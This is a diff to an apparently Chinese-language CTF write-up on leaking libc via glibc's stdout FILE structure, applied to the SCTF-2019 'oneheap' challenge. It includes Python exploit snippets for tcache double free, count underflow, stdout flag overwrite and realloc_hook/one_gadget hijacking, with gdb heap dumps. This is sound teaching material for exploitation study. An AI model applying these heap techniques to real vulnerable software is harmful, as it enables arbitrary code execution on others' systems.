@@ -11,7 +11,7 @@ mathjax: true
 {:toc}
 
 ### Overview
-在house of orange 之后，又一次利用_IO_FILE结构体，这次是用它泄露出libc地址。
+做堆题目的时候经常碰到没有show函数的情况，这时还可以用修改stdout结构的方式泄露出我们想要的libc地址。这种方式也变成近些年比赛的常规操作了。
 
 ### 0x00原理
 这项技术是通过修改stdout的结构体中的指针,使其输出更多数据，泄露出libc地址。
@@ -152,12 +152,11 @@ _flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
 ### 漏洞利用思路
 
 1. 在没有tcache时： 使用unsorted bin attack 写一个main_arena 地址到一个fastbin 的fd中
-2. 有tcache时 ： 
-整体思路：通过修改libc中的stdout的结构，进行泄露
+2. 有tcache时 ： 通过修改libc中的stdout的结构，进行泄露
 
-1. 同时修改_IO_IS_APPENDING(0x1000)和_IO_CURRENTLY_PUTTING(0x800)标志位.
-2. 同时修改_IO_CURRENTLY_PUTTING(0x800)标志位和stdout->_IO_write_base和stdout->_IO_read_end
-3. stdout已经输出过，所以_IO_CURRENTLY_PUTTING标志位就是1，我们只要修改stdout->_IO_write_base和stdout->_IO_read_end指针
+    * 同时修改_IO_IS_APPENDING(0x1000)和_IO_CURRENTLY_PUTTING(0x800)标志位.
+    * 同时修改_IO_CURRENTLY_PUTTING(0x800)标志位和stdout->_IO_write_base和stdout->_IO_read_end
+    * stdout已经输出过，所以_IO_CURRENTLY_PUTTING标志位就是1，我们只要修改stdout->_IO_write_base和stdout->_IO_read_end指针
 
 ### SCTF-2019-oneheap
 
@@ -176,7 +175,7 @@ _flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
 
 问题2：free次数不够如何构造unsorted bin 
 
-* 攻击tcache_perthread_struct ,
+* 修改count 创造unsorted bin
 tcache_perthread_struct 是管理tcache的结构，其中维护了已有的tcache chunk 地址
 ```
 typedef struct tcache_perthread_struct
@@ -186,48 +185,71 @@ typedef struct tcache_perthread_struct
 } tcache_perthread_struct;
 ```
 
-这个结构就放在堆的起始地址，基于double free 部分覆盖next指针指向tcache_perthread_struct 即可控制
-修改其中的count 让程序误认为已经有很多tcache ，因此下一次free 即可放到unsorted bin 中
+double free 导致chunk的fd指向自己，形成了一个无限循环,当调用malloc时可以多次申请出同一个chunk，每次结构中count 就会减1。
+如果两次free, 三次malloc就会导致count 变成0xff, 让程序误认为已经有很多tcache ，因此下一次free 直接放到unsorted bin中。
 
-double free 导致chunk的fd指向自己形成了一个无限循环,当调用malloc时可以多次申请出同一个chunk，每次结构中count 就会减1
-如果两次free, 三次malloc就会导致
+还需要注意，一旦放入unsorted bin 如果和top chunk 相邻就会合并，需要申请一个0x2f的chunk 防止合并，同时free掉放入tcache，准备下一次tcache poison使用。
 
-* double free + 部分覆盖
+```python
+    new(0x7f,"a"*4)
+    new(0x7f,"a"*4)
+    de()
+    de()
+
+    new(0x2f,"") # 防止新unsorted bin 和topchunk合并
+    de()
+
+    new(0x7f,"")
+    new(0x7f,"")
+    new(0x7f,"")
+    de()
+``` 
+
+堆情况如下
 
 ```
-new(0x70,"a"*4)
-de()
-de()
-```
-gdb调试如下
-
-```
-│0x5587f864b000 PREV_INUSE {
-│  mchunk_prev_size = 0x0,
-│  mchunk_size = 0x251,
-│  fd = 0x2000000000000,
-│  bk = 0x0,
-│  fd_nextsize = 0x0,
-│  bk_nextsize = 0x0
-│}
-│0x5587f864b250 FASTBIN {
-│  mchunk_prev_size = 0x0,
-│  mchunk_size = 0x81,
-│  fd = 0x5587f864b260,
-│  bk = 0x0,
-│  fd_nextsize = 0x0,
-│  bk_nextsize = 0x0
-│}
-
-
 tcachebins
-0x80 [  2]: 0x5587f864b260 ◂— 0x5587f864b260
+0x40 [  1]: 0x555555759380 ◂— 0x0
+0x90 [ -1]: 0x5555557592f0 —▸ 0x7ffff7dcfca0 (main_arena+96)
+unsortedbin
+all: 0x5555557592e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555557592e0
 ```
-可以看到同一个chunk两次被放到了tcachebin中,再通过new 将这个chunk fd修改为0x5587f864b000 ,即可控制tcache_perthread_struct
 
-* leak 地址
+此时chunk同时存在于tcache和unsorted bin 中，从unsorted bin 中分配堆块覆盖fd ，再使用tcache poisoning (类似UAF)
 
+#### 3. 泄露地址
 
+1. new chunk 修改fd为stdout地址，需要一点爆破 `\x60\x07\xdd`
+此时tcache 中的entry 依然指向原来的地址
+`0x90 [ -1]: 0x5555557592f0 —▸ 0x7ffff7dd0760 (_IO_2_1_stdout_)`
 
-> 部分写覆盖tcache的fd字段（该字段通过之前的tcache attack，已经预留一个libc地址）使其指向stdout，同时在修改的时候用unsorted bin attack打一个libc地址到stdout-flag（为了之后继续用tcache）。然后用tcache分配到stdout附近，修改stdout->flag（加APPENDING标识），并修改stdout->_IO_write_base最后一字节为'\x00'，泄露libc，然后tcache再次分配会分配到main_arena->top，修改top为malloc_hook 附近，并修复unsorted bin。之后就是常规操作了
+```python
+new(0x20,"\x60\x07\xdd")
+new(0x7f,p64(0)*5+p64(0xa1)) # 伪造size 合并下面的chunk
+new(0x7f,p64(0xfbad1800)+p64(0)*3+'\x00')
+```
+修改flag为0xfbad1800 构造stdout leak,覆盖write_base 指针的最低字节为\x00,下一次输出就会把write_base 到write_ptr的内容输出出来。
 
+#### 4. 攻击realloc_hook
+
+使用之前tcache中的`0x40 [  1]: 0x555555759380 ◂— 0x0` , 修改位于0x555555759380 的entry 指向realloc_hook(在malloc_hook前面)
+
+```
+unsorted bin 
+all: 0x555555759310 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555759310
+```
+二者距离0x60,申请0x68的chunk, 将0x555555759380 覆盖为realloc_hook
+但是此时堆中可用size 最大是0x60,需要将这个chunk扩大,才能利用malloc 0x68 覆盖tcache中chunk的fd为realloc_hook
+
+onegadget 直接覆盖malloc_hook 不好用, 需要将malloc_hook覆盖为realloc的地址,再将realloc_hook覆盖为onegadget,可以通过调整realloc 的地址来满足onegadget 的条件。 
+
+![](IMG/2019-10-31-leak_IO_stdout/oneheap.png)
+
+#### Final
+
+chunk 2f0即在unsorted bin 中又在tcache中，可以修改2f0两次：
+* 第一次 malloc 0x20 修改fd为stdout 地址
+* 第二次 malloc 0x7f 一是把tcache 中的chunk拿出来， 二是修改unsorted bin 的chunk size 使其满足申请0x68块(将原来的0x61改成0xa1)
+
+在这道题中后面的堆布局稍微难理解一点,调试的时候把随机化关掉，再画一画图就好了。
+据说有爆破更少的解法，有空再更，欢迎交流。
